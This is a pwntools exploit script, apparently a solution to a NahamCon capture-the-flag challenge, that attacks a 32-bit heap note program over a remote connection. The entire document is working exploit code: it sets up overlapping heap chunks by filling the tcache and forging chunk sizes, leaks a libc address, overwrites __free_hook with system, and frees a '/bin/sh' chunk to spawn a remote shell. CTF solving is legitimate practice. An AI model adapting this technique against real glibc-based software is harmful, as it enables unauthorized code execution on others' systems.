#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./libc6-i386_2.27-3ubuntu1_amd64.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
        return process(exe.path, env={"LD_PRELOAD": libc.path})

#r = conn()
r = remote("challenge.nahamcon.com", 32341)

sla = lambda a,b : r.sendlineafter(a,b)
sa  = lambda a,b : r.sendafter(a,b)
s   = lambda a   : r.send(a)
sl  = lambda a   : r.sendline(a)

def rs(data, ss=1):
    r.recv()
    if(ss):
        sl(data)
    else:
        s(data)

def alloc(index, size, data=""):
    if(data == ""):
        data = str(index)*(size-1)
    rs("add")
    rs(str(index))
    rs(str(size))
    rs(data, 0)

def edit(index, data):
    rs("edit")
    rs(str(index))
    rs(data, 0)

def free(index):
    rs("delete")
    rs(str(index))

def show():
    rs("print")

def fill_tcache(size):    
    for i in range(7):
        alloc(i, size, str(i)*size)

    for i in range(7):
        free(i)


def main():
    

    alloc(0, 0x10)

    alloc(7,0x12c)
    alloc(8,0x11c)
    free(0)
    alloc(9,0x11c)

    fill_tcache(0xf0)
    fill_tcache(0x12c)

    free(7)
    edit(8, b"M"*0x118 + p32(0x260))
    edit(9, (p32(0) + p32(0x11))*(0x11c//8))

    free(9)

    alloc(0, 0x13c, "MAHER")

    show()
    r.recvuntil("User 8 email: ")
    leak = u32(r.recv(4))
    log.warn("Libc leak @ 0x%x", leak)
    
    libc.address = leak - 0x1d57d8
    log.warn("Libc base @ 0x%x", libc.address)
    
    edit(0, b"A"*0x130 + p32(0x4) + p32(libc.sym['__free_hook']))
    edit(8, p32(libc.sym['system']))

    alloc(1, 0x8, "/bin/sh\x00")
    free(1)
    r.interactive()


if __name__ == "__main__":
    main()
